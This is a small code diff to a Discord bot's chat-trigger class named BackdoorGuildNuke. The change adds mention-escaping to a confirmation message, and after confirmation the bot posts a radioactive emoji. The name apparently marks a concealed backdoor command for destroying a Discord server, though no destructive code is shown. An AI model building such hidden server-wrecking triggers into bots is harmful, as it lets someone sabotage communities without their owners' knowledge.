@@ -111,7 +111,7 @@ class BackdoorGuildNuke(chattrigger.ChatTrigger):
         pretty_printed_values = ", ".join(f"{k}: {v}" for k, v in values.items())
 
         await message.channel.send(f"Are you sure you want to continue with this information?\n"
-                                   f"{pretty_printed_values}")
+                                   f"{discord.utils.escape_mentions(pretty_printed_values)}")
 
         if await confirmation():
             await message.channel.send("☢️")
